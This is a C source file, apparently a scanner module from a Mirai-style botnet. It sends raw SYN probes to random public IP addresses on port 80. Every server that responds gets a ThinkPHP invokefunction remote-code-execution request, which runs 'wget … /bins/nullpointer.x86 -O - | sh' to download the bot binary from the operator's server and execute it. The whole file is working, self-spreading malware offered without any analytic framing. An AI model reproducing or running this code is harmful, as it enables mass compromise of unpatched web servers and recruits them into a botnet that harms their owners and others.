#ifdef NP_TELNET
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <time.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#include "includes.h"
#include "thinkphp.h"
#include "rand.h"
#include "util.h"
#include "checksum.h"
#include "scanner_exclude.h"

int thinkphp_scanner_pid = 0;
char thinkphp_scanner_rawpkt[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
struct thinkphp_scanner_connection *thinkphp_conn_table;
uint32_t thinkphp_fake_time = 0;

static ipv4_t thinkphp_get_random_ip(void)
{
	uint32_t tmp;
	uint8_t o1, o2, o3, o4;
	do {
		tmp = rand_next();
		o1 = tmp & 0xff;
		o2 = (tmp >> 8) & 0xff;
		o3 = (tmp >> 16) & 0xff;
		o4 = (tmp >> 24) & 0xff;
	} while (o1 == 127 || o1 == 0 || o1 == 10 ||
		(o1 == 192 && o2 == 168) || (o1 == 172 && o2 >= 16 && o2 < 32) ||
		(o1 >= 224) || (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 ||
		o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215));
	int r = rand_next() % 4;
	if (r == 0) return INET_ADDR(88, o2, o3, o4);
	if (r == 1) return INET_ADDR(95, o2, o3, o4);
	if (r == 2) return INET_ADDR(112, o2, o3, o4);
	return INET_ADDR(o1, o2, o3, o4);
}

static void thinkphp_setup_connection(struct thinkphp_scanner_connection *conn)
{
	struct sockaddr_in addr = {0};
	if (conn->fd != -1) close(conn->fd);
	if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) return;
	conn->rdbuf_pos = 0;
	util_zero(conn->rdbuf, sizeof(conn->rdbuf));
	fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = conn->dst_addr;
	addr.sin_port = conn->dst_port;
	conn->last_recv = thinkphp_fake_time;
	conn->state = (conn->state == THINKPHP_SC_EXPLOIT_STAGE2 || conn->state == THINKPHP_SC_EXPLOIT_STAGE3) ? conn->state : THINKPHP_SC_CONNECTING;
	connect(conn->fd, (struct sockaddr *)&addr, sizeof(addr));
}

void thinkphp_init(void)
{
	int i;
	uint16_t source_port;
	struct iphdr *iph;
	struct tcphdr *tcph;

	int pid = fork();
	if (pid > 0) { thinkphp_scanner_pid = pid; return; }
	if (pid == -1) return;

	LOCAL_ADDR = util_local_addr();
	rand_init();
	thinkphp_fake_time = time(NULL);
	thinkphp_conn_table = calloc(THINKPHP_SCANNER_MAX_CONNS, sizeof(struct thinkphp_scanner_connection));
	for (i = 0; i < THINKPHP_SCANNER_MAX_CONNS; i++) {
		thinkphp_conn_table[i].state = THINKPHP_SC_CLOSED;
		thinkphp_conn_table[i].fd = -1;
	}

	int rsck;
	if ((rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) exit(0);
	fcntl(rsck, F_SETFL, O_NONBLOCK | fcntl(rsck, F_GETFL, 0));
	int one = 1;
	if (setsockopt(rsck, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) != 0) { close(rsck); exit(0); }
	do { source_port = rand_next() & 0xffff; } while (ntohs(source_port) < 1024);

	iph = (struct iphdr *)thinkphp_scanner_rawpkt;
	tcph = (struct tcphdr *)(iph + 1);
	iph->ihl = 5; iph->version = 4; iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
	iph->id = rand_next(); iph->ttl = 64; iph->protocol = IPPROTO_TCP;
	tcph->dest = htons(80); tcph->source = source_port;
	tcph->doff = 5; tcph->window = rand_next() & 0xffff; tcph->syn = TRUE;

	while (1) {
		fd_set fdset_rd, fdset_wr;
		struct thinkphp_scanner_connection *conn;
		struct timeval tim;
		int last_avail = 0, last_spew = 0, mfd_rd = 0, mfd_wr = 0;

		if (thinkphp_fake_time != last_spew) {
			last_spew = thinkphp_fake_time;
			for (i = 0; i < THINKPHP_SCANNER_RAW_PPS; i++) {
				struct sockaddr_in paddr = {0};
				iph = (struct iphdr *)thinkphp_scanner_rawpkt;
				tcph = (struct tcphdr *)(iph + 1);
				iph->id = rand_next();
				iph->saddr = LOCAL_ADDR;
				iph->daddr = thinkphp_get_random_ip();
				iph->check = 0;
				iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
				tcph->dest = htons(80);
				tcph->seq = iph->daddr;
				tcph->check = 0;
				tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
				paddr.sin_family = AF_INET;
				paddr.sin_addr.s_addr = iph->daddr;
				paddr.sin_port = tcph->dest;
				sendto(rsck, thinkphp_scanner_rawpkt, sizeof(thinkphp_scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof(paddr));
			}
		}

		while (1) {
			char dgram[1514];
			iph = (struct iphdr *)dgram;
			tcph = (struct tcphdr *)(iph + 1);
			errno = 0;
			int n = recvfrom(rsck, dgram, sizeof(dgram), MSG_NOSIGNAL, NULL, NULL);
			if (n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK) break;
			if (n < (int)(sizeof(struct iphdr) + sizeof(struct tcphdr))) continue;
			if (iph->daddr != LOCAL_ADDR || iph->protocol != IPPROTO_TCP) continue;
			if (tcph->source != htons(80) || tcph->dest != source_port) continue;
			if (!tcph->syn || !tcph->ack || tcph->rst || tcph->fin) continue;
			if (htonl(ntohl(tcph->ack_seq) - 1) != iph->saddr) continue;
			if (scanner_is_excluded(iph->saddr)) continue;

			conn = NULL;
			for (n = last_avail; n < THINKPHP_SCANNER_MAX_CONNS; n++) {
				if (thinkphp_conn_table[n].state == THINKPHP_SC_CLOSED) {
					conn = &thinkphp_conn_table[n];
					last_avail = n;
					break;
				}
			}
			if (conn == NULL) break;
			conn->dst_addr = iph->saddr;
			conn->dst_port = tcph->source;
			thinkphp_setup_connection(conn);
		}

		FD_ZERO(&fdset_rd); FD_ZERO(&fdset_wr);
		for (i = 0; i < THINKPHP_SCANNER_MAX_CONNS; i++) {
			conn = &thinkphp_conn_table[i];
			if (conn->state != THINKPHP_SC_CLOSED && (thinkphp_fake_time - conn->last_recv) > 5) {
				close(conn->fd);
				conn->fd = -1;
				conn->state = THINKPHP_SC_CLOSED;
				util_zero(conn->rdbuf, sizeof(conn->rdbuf));
				continue;
			}
			if (conn->state == THINKPHP_SC_CONNECTING || conn->state == THINKPHP_SC_EXPLOIT_STAGE2 || conn->state == THINKPHP_SC_EXPLOIT_STAGE3) {
				FD_SET(conn->fd, &fdset_wr);
				if (conn->fd > mfd_wr) mfd_wr = conn->fd;
			} else if (conn->state != THINKPHP_SC_CLOSED) {
				FD_SET(conn->fd, &fdset_rd);
				if (conn->fd > mfd_rd) mfd_rd = conn->fd;
			}
		}

		tim.tv_usec = 0; tim.tv_sec = 1;
		select(1 + (mfd_wr > mfd_rd ? mfd_wr : mfd_rd), &fdset_rd, &fdset_wr, NULL, &tim);
		thinkphp_fake_time = time(NULL);

		for (i = 0; i < THINKPHP_SCANNER_MAX_CONNS; i++) {
			conn = &thinkphp_conn_table[i];
			if (conn->fd == -1) continue;

			if (FD_ISSET(conn->fd, &fdset_wr)) {
				int err = 0;
				socklen_t err_len = sizeof(err);
				getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
				if (err != 0) {
					close(conn->fd);
					conn->fd = -1;
					conn->state = THINKPHP_SC_CLOSED;
					continue;
				}
				if (conn->state == THINKPHP_SC_EXPLOIT_STAGE2) {
					struct in_addr ia; ia.s_addr = SERVIP;
					snprintf(conn->payload_buf, sizeof(conn->payload_buf),
						"GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://%s/bins/nullpointer.x86 -O - | sh' HTTP/1.1\r\nConnection: keep-alive\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
						inet_ntoa(ia));
					send(conn->fd, conn->payload_buf, util_strlen(conn->payload_buf), MSG_NOSIGNAL);
					util_zero(conn->payload_buf, sizeof(conn->payload_buf));
					close(conn->fd);
					conn->fd = -1;
					conn->state = THINKPHP_SC_CLOSED;
					continue;
				}
				if (conn->state == THINKPHP_SC_EXPLOIT_STAGE3) {
					close(conn->fd);
					conn->fd = -1;
					conn->state = THINKPHP_SC_CLOSED;
					continue;
				}
				conn->state = THINKPHP_SC_EXPLOIT_STAGE2;
			}

			if (FD_ISSET(conn->fd, &fdset_rd)) {
				int ret = recv(conn->fd, conn->rdbuf + conn->rdbuf_pos, THINKPHP_SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
				if (ret > 0) {
					conn->rdbuf_pos += ret;
					conn->last_recv = thinkphp_fake_time;
				} else if (ret <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
					close(conn->fd);
					conn->fd = -1;
					conn->state = THINKPHP_SC_CLOSED;
					util_zero(conn->rdbuf, sizeof(conn->rdbuf));
				}
			}
		}
	}
}

void thinkphp_kill(void)
{
	if (thinkphp_scanner_pid > 0) kill(thinkphp_scanner_pid, 9);
}
#endif
